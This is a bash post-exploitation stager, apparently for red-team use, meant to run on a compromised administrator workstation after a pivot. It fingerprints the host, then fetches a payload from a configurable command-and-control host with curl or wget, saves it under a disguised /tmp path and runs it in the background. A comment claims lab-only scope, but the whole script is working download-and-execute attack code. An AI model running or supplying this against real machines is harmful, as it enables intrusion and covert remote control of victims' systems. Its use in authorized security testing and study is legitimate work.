#!/usr/bin/env bash
# Runs ON admin workstation after pivot (stdin via ssh 'bash -s').
# LAB / authorized scope only — replace C2_HOST before use; do not commit real C2 URLs.
set -euo pipefail

C2_HOST="${C2_HOST:-http://127.0.0.1:8080}"
STAGE_PATH="${STAGE_PATH:-/tmp/.cache-update}"
PAYLOAD_NAME="${PAYLOAD_NAME:-stage}"

echo "=== post-pivot staging $(date -Iseconds) ==="
echo "[host] $(hostname) [user] $(whoami) [uid] $(id -u)"

# Light fingerprint (optional — comment out for quieter run)
ip -br a 2>/dev/null | head -5 || true

echo "[*] beacon: fetch stage from ${C2_HOST}/${PAYLOAD_NAME}"
if command -v curl >/dev/null 2>&1; then
  curl -fsSL "${C2_HOST}/${PAYLOAD_NAME}" -o "${STAGE_PATH}" \
    && chmod +x "${STAGE_PATH}" \
    && echo "[*] beacon: executing ${STAGE_PATH} (background)" \
    && nohup "${STAGE_PATH}" >/dev/null 2>&1 &
elif command -v wget >/dev/null 2>&1; then
  wget -qO "${STAGE_PATH}" "${C2_HOST}/${PAYLOAD_NAME}" \
    && chmod +x "${STAGE_PATH}" \
    && nohup "${STAGE_PATH}" >/dev/null 2>&1 &
else
  echo "[-] no curl/wget — stage skipped"
  exit 1
fi

echo "[+] beacon dispatched (pid $!)"
echo "=== end ==="